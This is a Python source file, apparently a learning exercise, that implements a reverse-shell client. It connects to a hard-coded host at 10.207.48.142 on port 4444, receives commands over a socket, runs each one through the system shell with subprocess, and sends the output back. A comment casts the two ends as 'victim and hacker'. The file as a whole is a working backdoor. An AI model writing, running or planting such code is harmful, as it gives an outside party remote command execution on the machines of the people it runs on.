import socket
import os
import pathlib
import subprocess
import json

#subprocess allows you to execute system commands/other programs from python
#subprocess.call('ipconfig',shell=True)

#subprocess - some of them will run in the backgorund , foreground
#some of them will finish executing then only other will execute - call - foreground
# https://stackoverflow.com/questions/7681715/whats-the-difference-between-subprocess-popen-and-call-how-can-i-use-them#:~:text=Popen%20is%20more%20general%20than,Popen%20returns%20a%20Popen%20object.

class SockClient:
    def __init__(self,host,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((host,port))
        print("hi am here")

    def command_execute_result(self,command):
        return subprocess.check_output(command,shell=True)
    def reliable_send(self,data):
        data = data.decode()
        json_data = json.dumps(data)

        json_data = json_data.encode()
        self.connection.send(json_data)
    def reliable_receive(self):
        #data will receive at bytes and cound't able to transfer all data at once
        # so while loop is requried to make sure all data is received and print other than
        #the buffer size which we always give
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        # connection.send(b"connecting estalished")
        while True:
            command = self.reliable_receive()
            # command = command.decode()
            command_result = self.command_execute_result(command)
            print(type(command_result))
            # connection.send(command_result)
            self.reliable_send(command_result)
            # print(command_result.decode())
        connection.close()



#adding our own listener btn victim and hacker - check next file
client1 = SockClient("10.207.48.142",4444)
client1.run()